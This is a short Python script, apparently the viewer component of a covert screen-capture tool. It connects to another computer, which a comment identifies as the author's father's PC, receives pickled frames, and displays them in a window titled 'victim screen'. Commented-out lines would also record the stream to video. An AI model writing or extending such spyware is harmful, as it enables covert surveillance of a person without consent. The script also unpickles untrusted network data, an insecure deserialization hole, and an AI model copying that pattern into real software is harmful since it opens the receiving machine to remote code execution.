
import socket, cv2, pickle, struct

"""cv2.nameWindow("pantalla victima", cv2.WINDOW_NORMAL)
cv2.resizeWindow("pantalla victima", 480, 270)"""

"""codec = cv2.VideoWriter_fourcc(*"mp4v")
out = cv2.VideoWriter("Grabacion1.mp4", codec , 15.0,(1366, 768))"""


client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host_ip = '192.168.1.11'#papa pc ip
port =  9999
client_socket.connect((host_ip,port))
data = b""
payload_size = struct.calcsize("Q")

while True:
    while len(data) < payload_size:
        packet = client_socket.recv(4*1024)
        if not packet:break
        data+=packet
    packed_msg_size = data[:payload_size]
    data = data[payload_size:]
    msg_size = struct.unpack("Q",packed_msg_size)[0]

    while len(data) < msg_size:
        data += client_socket.recv(4*1024)

    frame_data = data[:msg_size]
    data = data[msg_size:]
    frame = pickle.loads(frame_data)
        
    cv2.imshow("pantalla victima", frame)
    key = cv2.waitKey(1) & 0xFF

    if key == ord('q'):
        break